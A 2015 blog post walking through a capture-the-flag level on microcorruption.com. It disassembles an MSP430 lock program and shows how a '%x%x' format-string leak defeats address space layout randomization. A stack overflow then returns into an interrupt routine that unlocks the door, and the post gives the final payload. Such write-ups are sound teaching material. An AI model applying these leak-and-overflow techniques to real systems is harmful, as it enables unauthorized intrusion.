---
layout: post
title: 'Fun with Assembly 15: Address space layout randomization'
date: 2015-09-01
status: publish
type: post
published: true
author: Hywel Carver
---
This is the fifteenth in a series. You might want to read the [previous post]({% post_url 2015-08-31-fun-with-assembly-14 %}) before reading this.

This post is based on the Vladivostock level on [microcorruption.com](http://microcorruption.com). Like last time, we’re trying to find an input to open a lock without knowing the correct password, using knowledge of assembly language.

# First steps

In this level, we're going to be dealing with [address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization). The idea is that nothing in memory has a predictable address (including the executable, libraries, heap and stack). This makes it harder to exploit, because the exploits we'd want to use will almost always depend on specific memory addresses.

    4438 <main>
    4438:  b012 1c4a      call  #0x4a1c <rand>
    443c:  0b4f           mov r15, r11
    443e:  3bf0 fe7f      and #0x7ffe, r11
    4442:  3b50 0060      add #0x6000, r11

Create a random even number between `0x6000` and `0xdffe` in `r11`.

    444c:  3012 0010      push  #0x1000
    4450:  3012 0044      push  #0x4400 <__init_stack>
    4454:  0b12           push  r11
    4456:  b012 e849      call  #0x49e8 <_memcpy>
    445a:  3150 0600      add #0x6, sp

Copy 4096 bytes from the code segment to `r11`.

    4446:  b012 1c4a      call  #0x4a1c <rand>
    4460:  3ff0 fe0f      and #0xffe, r15
    4464:  0e4b           mov r11, r14
    4466:  0e8f           sub r15, r14
    4468:  3e50 00ff      add #0xff00, r14

Create a random even number below `0xffe`. Subtract that from the new top of the `code segment`, then subtract another `0x100`, stored in`r14`.

    446c:  0d4b           mov r11, r13
    446e:  3d50 5c03      add #0x35c, r13
    4472:  014e           mov r14, sp
    4474:  0f4b           mov r11, r15
    4476:  8d12           call  r13

Call the function that was originally at `0x4400` + `0x35c` (which is `aslr_main`) with a pointer to the top of the new randomized code section. But first, we set the stack pointer to be the randommized value in `r14`.

    475c <aslr_main>
    475c:  0e4f           mov r15, r14
    475e:  3e50 8200      add #0x82, r14
    4762:  8e12           call  r14

This calls the function `0x82` bytes into the code section, which would originally have been at `0x4482`. That's the function `_aslr_main`.

### Delving deeper

The `_aslr_main` function is pretty long. That's because the function can't store things anything at specific addresses, because of the use of ASLR.

    4482 <_aslr_main>
    4482:  0b12           push  r11
    4484:  0a12           push  r10
    4486:  3182           sub #0x8, sp
    ...
    4754:  3152           add #0x8, sp
    4756:  3a41           pop r10
    4758:  3b41           pop r11
    475a:  3041           ret

Preserve some registers from the calling function, and add 8 bytes to the stack, which are all then reversed at the end.

    4488:  0c4f           mov r15, r12
    448a:  3c50 6a03      add #0x36a, r12
    448e:  814c 0200      mov r12, 0x2(sp)

`r15` still has the start of the randomized code section, so the function pointed to by `r12` would be the one that started out at `0x4400` + `0x36a`, which is `printf`. That address gets saved onto the stack at `0x2(sp)`.

    4492:  0e43           clr r14
    4494:  ce43 0044      mov.b #0x0, 0x4400(r14)
    4498:  1e53           inc r14
    449a:  3e90 0010      cmp #0x1000, r14
    449e:  fa23           jne #0x4494 <_aslr_main+0x12>

Sets every byte from `0x4400` to `0x5400` to `0x0`.

    44a0:  f240 5500 0224 mov.b #0x55, &0x2402
    44a6:  f240 7300 0324 mov.b #0x73, &0x2403
    44ac:  f240 6500 0424 mov.b #0x65, &0x2404
    44b2:  f240 7200 0524 mov.b #0x72, &0x2405
    44b8:  f240 6e00 0624 mov.b #0x6e, &0x2406
    44be:  f240 6100 0724 mov.b #0x61, &0x2407
    44c4:  f240 6d00 0824 mov.b #0x6d, &0x2408
    44ca:  f240 6500 0924 mov.b #0x65, &0x2409
    44d0:  f240 2000 0a24 mov.b #0x20, &0x240a
    44d6:  f240 2800 0b24 mov.b #0x28, &0x240b
    44dc:  f240 3800 0c24 mov.b #0x38, &0x240c
    44e2:  f240 2000 0d24 mov.b #0x20, &0x240d
    44e8:  f240 6300 0e24 mov.b #0x63, &0x240e
    44ee:  f240 6800 0f24 mov.b #0x68, &0x240f
    44f4:  f240 6100 1024 mov.b #0x61, &0x2410
    44fa:  f240 7200 1124 mov.b #0x72, &0x2411
    4500:  f240 2000 1224 mov.b #0x20, &0x2412
    4506:  f240 6d00 1324 mov.b #0x6d, &0x2413
    450c:  f240 6100 1424 mov.b #0x61, &0x2414
    4512:  f240 7800 1524 mov.b #0x78, &0x2415
    4518:  f240 2900 1624 mov.b #0x29, &0x2416
    451e:  f240 3a00 1724 mov.b #0x3a, &0x2417
    4524:  c243 1824      mov.b #0x0, &0x2418

Insert the string "Username (8 char max):" at `0x2402`. This has to be done dynamically because of the randomization of the address space.

    4528:  b240 1700 0024 mov #0x17, &0x2400

Move the byte `0x17` to `0x2400`. It's not clear why at the moment, but it's probably no coincidence that this value (= 23) is the length of the string, including its null byte at the end.

    452e:  3e40 0224      mov #0x2402, r14
    4532:  0b43           clr r11
    4534:  103c           jmp #0x4556 <_aslr_main+0xd4>
    4536:  1e53           inc r14
    4538:  8d11           sxt r13
    453a:  0b12           push  r11
    453c:  0d12           push  r13
    453e:  0b12           push  r11
    4540:  0012           push  pc
    4542:  0212           push  sr
    4544:  0f4b           mov r11, r15
    4546:  8f10           swpb  r15
    4548:  024f           mov r15, sr
    454a:  32d0 0080      bis #0x8000, sr
    454e:  b012 1000      call  #0x10
    4552:  3241           pop sr
    4554:  3152           add #0x8, sp
    4556:  6d4e           mov.b @r14, r13
    4558:  4d93           tst.b r13
    455a:  ed23           jnz #0x4536 <_aslr_main+0xb4>
    455c:  0e43           clr r14
    455e:  3d40 0a00      mov #0xa, r13
    4562:  0e12           push  r14
    4564:  0d12           push  r13
    4566:  0e12           push  r14
    4568:  0012           push  pc
    456a:  0212           push  sr
    456c:  0f4e           mov r14, r15
    456e:  8f10           swpb  r15
    4570:  024f           mov r15, sr
    4572:  32d0 0080      bis #0x8000, sr
    4576:  b012 1000      call  #0x10
    457a:  3241           pop sr
    457c:  3152           add #0x8, sp

This looks complicated, but it's actually just the `puts` function, with `0x2402` as the argument. So this is just going to output the string above. The process of embedding the code for one function inside another is normally called "inlining".

    457e:  3d50 3400      add #0x34, r13

This will make `r13` be `0x3e`, the ASCII code for ">" (the previous value in there was `0xa`);

    4582:  0e12           push  r14
    4584:  0d12           push  r13
    4586:  0e12           push  r14
    4588:  0012           push  pc
    458a:  0212           push  sr
    458c:  0f4e           mov r14, r15
    458e:  8f10           swpb  r15
    4590:  024f           mov r15, sr
    4592:  32d0 0080      bis #0x8000, sr
    4596:  b012 1000      call  #0x10
    459a:  3241           pop sr
    459c:  3152           add #0x8, sp
    459e:  0e12           push  r14
    45a0:  0d12           push  r13
    45a2:  0e12           push  r14
    45a4:  0012           push  pc
    45a6:  0212           push  sr
    45a8:  0f4e           mov r14, r15
    45aa:  8f10           swpb  r15
    45ac:  024f           mov r15, sr
    45ae:  32d0 0080      bis #0x8000, sr
    45b2:  b012 1000      call  #0x10
    45b6:  3241           pop sr
    45b8:  3152           add #0x8, sp

This is `putchar` written twice, inlined. So we print ">>" to the screen, to prompt for the password.

    45ba:  3a42           mov #0x8, r10
    45bc:  3b40 2624      mov #0x2426, r11
    45c0:  2d43           mov #0x2, r13
    45c2:  0a12           push  r10
    45c4:  0b12           push  r11
    45c6:  0d12           push  r13
    45c8:  0012           push  pc
    45ca:  0212           push  sr
    45cc:  0f4d           mov r13, r15
    45ce:  8f10           swpb  r15
    45d0:  024f           mov r15, sr
    45d2:  32d0 0080      bis #0x8000, sr
    45d6:  b012 1000      call  #0x10
    45da:  3241           pop sr
    45dc:  3152           add #0x8, sp

This is `getsn` inlined, for input of `0x8` bytes to be stored at `0x2426` (in `r11`).

    45de:  c24e 2e24      mov.b r14, &0x242e

Set a null byte after the 8 bytes of the input string.

    45e2:  0b12           push  r11
    45e4:  8c12           call  r12

This calls `printf` (remember: its address was stored in `r12`) and passes the input string. This is very helpful for us to form an exploit. You might remember from before level: `printf` has helpful flags that we can include in our input to perform operations the programmers didn't intend.

Those flags include `%s` for printing a string, `%x` for printing an unsigned integer in base16, `%c` for printing a character and `%n` for writing out the number of bytes written so far to an address in memory.

The arguments that `printf` uses to calculate these flags are the next values down on the stack. In this case, the things most recently pushed to the stack are the status register and the program counter.

That last one is very useful to us - if we know the value of the program counter at the point when it was pushed to the stack, we can work out where the address space has been randomly moved to, which means we can get round all of the protection of address space layout randomization. 

By entering a username of "%x%x", we will be able to extract some addresses from the output - playing around with this shows that the second address is the address of the `printf`. Before the code section was moved to a random location, that value would have been at `0x476a` so by comparing the two, we get the distance moved by the ASLR.

We could have worked out that the second address was `printf`. At the start of the `_aslr_main` function, `r12` was written to `0x2(sp)`, and as we saw at the time, `r12` pointed to `printf`.

    45e6:  2153           incd  sp
    45e8:  0f4b           mov r11, r15
    45ea:  033c           jmp #0x45f2 <_aslr_main+0x170>
    45ec:  cf43 0000      mov.b #0x0, 0x0(r15)
    45f0:  1f53           inc r15
    45f2:  3f90 3224      cmp #0x2432, r15
    45f6:  fa23           jne #0x45ec <_aslr_main+0x16a>

Nullify all the bytes from `0x2426` to `0x2432`. This will overwrite the username just entered - presumably only the password is actually needed for the lock.

    45f8:  f240 0a00 0224 mov.b #0xa, &0x2402
    45fe:  f240 5000 0324 mov.b #0x50, &0x2403
    4604:  f240 6100 0424 mov.b #0x61, &0x2404
    460a:  f240 7300 0524 mov.b #0x73, &0x2405
    4610:  f240 7300 0624 mov.b #0x73, &0x2406
    4616:  f240 7700 0724 mov.b #0x77, &0x2407
    461c:  f240 6f00 0824 mov.b #0x6f, &0x2408
    4622:  f240 7200 0924 mov.b #0x72, &0x2409
    4628:  f240 6400 0a24 mov.b #0x64, &0x240a
    462e:  f240 3a00 0b24 mov.b #0x3a, &0x240b
    4634:  c243 0c24      mov.b #0x0, &0x240c

Move the string "\nPassword:" to `0x2402`.

    4638:  3e40 0224      mov #0x2402, r14
    463c:  0c43           clr r12
    463e:  103c           jmp #0x4660 <_aslr_main+0x1de>
    4640:  1e53           inc r14
    4642:  8d11           sxt r13
    4644:  0c12           push  r12
    4646:  0d12           push  r13
    4648:  0c12           push  r12
    464a:  0012           push  pc
    464c:  0212           push  sr
    464e:  0f4c           mov r12, r15
    4650:  8f10           swpb  r15
    4652:  024f           mov r15, sr
    4654:  32d0 0080      bis #0x8000, sr
    4658:  b012 1000      call  #0x10
    465c:  3241           pop sr
    465e:  3152           add #0x8, sp
    4660:  6d4e           mov.b @r14, r13
    4662:  4d93           tst.b r13
    4664:  ed23           jnz #0x4640 <_aslr_main+0x1be>
    4666:  0e43           clr r14
    4668:  3d40 0a00      mov #0xa, r13
    466c:  0e12           push  r14
    466e:  0d12           push  r13
    4670:  0e12           push  r14
    4672:  0012           push  pc
    4674:  0212           push  sr
    4676:  0f4e           mov r14, r15
    4678:  8f10           swpb  r15
    467a:  024f           mov r15, sr
    467c:  32d0 0080      bis #0x8000, sr
    4680:  b012 1000      call  #0x10
    4684:  3241           pop sr
    4686:  3152           add #0x8, sp

This is `puts`, inlined with an argument of `0x2402`, so that the string "\nPassword:" is printed to the console.

    4688:  0b41           mov sp, r11
    468a:  2b52           add #0x4, r11
    468c:  3c40 1400      mov #0x14, r12
    4690:  2d43           mov #0x2, r13
    4692:  0c12           push  r12
    4694:  0b12           push  r11
    4696:  0d12           push  r13
    4698:  0012           push  pc
    469a:  0212           push  sr
    469c:  0f4d           mov r13, r15
    469e:  8f10           swpb  r15
    46a0:  024f           mov r15, sr
    46a2:  32d0 0080      bis #0x8000, sr
    46a6:  b012 1000      call  #0x10
    46aa:  3241           pop sr
    46ac:  3152           add #0x8, sp

This is the `gets` function, inlined, writing up to `0x14` (= 20) bytes, 4 bytes into the stack. The fact that this is written to the stack is crucial - it means we can overflow the current stack frame, and overwrite the return address of the function.

At this point, the stack looks something like `<8 bytes of frame><2 bytes of stored register><2 bytes of stored register><2 bytes of return address>`. If we start writing 4 bytes into that, then we need 8 bytes of filler content, before writing over the return address.

Unfortunately, there's no `unlock_door` function for us to drop into. What the `unlock_door` function actually does is to use an interrupt with an argument of `0x7f`. Maybe we can do that instead.

When we return into the function, its argument will be the next 2 bytes on the stack - which we can also write to, after overwriting the return address!

So this gives us our exploit. The code has a stack-based interrupt function, `_INT`, at the address `0x48ec`, which we can use. Our input to the username will tell us the new address of the `printf` function which used to be at `0x476a`. That means if we take that new address and add on `0x182`, we should get to the new address of `0x48ec` (`0x48ec - 0x476a = 0x182`).

If we then append `0x7f7f7f`, we should be able to pass `0x7f` as an argument to `_INT` (`_INT` takes its argument as `0x2(sp)` which is why we need two bytes of filler in the argument here).

As an example, first I enter `%x%x` as the username, and get the output `0000cf50`. That means `printf` is now found at `0xcf50`. Adding `0x182` get us to `0xd0d2` as the location for the `_INT` function. So my password become 8 bytes of filler, then `0xd2d0` then `0x7f7f7f`.

`0x4141414141414141d2d07f7f7f`

# The door springs open

The randomization of the ASLR does make this much harder to debug, right up until you can reliably extract the address of any single byte. Once you can do that the ASLR is broken, and you can use any exploit you would have been able to do without ASLR.